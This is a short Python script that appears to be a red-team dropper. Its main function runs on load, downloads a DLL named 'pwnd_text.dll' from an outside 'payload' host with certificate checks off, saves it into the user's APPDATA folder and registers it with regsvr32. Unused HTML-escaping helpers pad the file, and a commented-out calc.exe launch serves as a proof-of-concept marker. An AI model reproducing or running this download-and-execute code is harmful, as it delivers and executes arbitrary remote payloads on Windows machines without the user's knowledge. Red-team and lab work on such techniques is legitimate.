import sys
import os
import subprocess

# Import standalone requests library

sys.path.insert(0,os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import requests


html_escape_table = { 
       "&": "&amp;",
      '"': "&quot;",
       "'": "&apos;",
       ">": "&gt;",
       "<": "&lt;",
       }

def html_escape(text):
	"""Produce entities within text."""
	return "".join(html_escape_table.get(c,c) for c in text)


def unescape(s):
	s = s.replace("&lt;", "<")
	s = s.replace("&gt;", ">")
	# this has to be last:
	s = s.replace("&amp;", "&")
	return s

def main():
	package_dir = os.getenv('APPDATA') + '\\decode.dll'

	""" http://files.red.lab/payload/pwnd_text.dll"""
	url = "http://files.red.lab/payload/pwnd_text.dll"
	res = requests.get(url, verify= False )
	with open(package_dir, "wb+") as outfile:
		outfile.write(res.content)

	if os.path.exists(package_dir):

		subprocess.call("regsvr32.exe "+package_dir)

	else:
		msg = 'path does not exists'

main()
#subprocess.call("C:\\Windows\\System32\\calc.exe")

		
